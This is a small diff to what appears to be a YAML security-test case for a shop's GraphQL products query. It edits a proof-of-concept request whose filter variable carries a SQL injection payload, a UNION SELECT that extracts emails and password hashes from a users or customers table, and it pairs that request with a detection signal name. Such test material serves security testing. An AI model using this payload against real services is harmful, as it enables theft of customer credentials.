@@ -31,7 +31,7 @@ oracle:
 
     '
   poc: POST /graphql {"query":"query($f:ProductFilter){products(filter:$f){id title}}","variables":{"f":{"tag":"x'
-    UNION SELECT id,email,password_hash,1,1 FROM users--"}}}
+    UNION SELECT id,email,password_hash,1,1 FROM customers--"}}}
   signal: shop.graph.products.plan_anomaly
 tags:
 - graphql
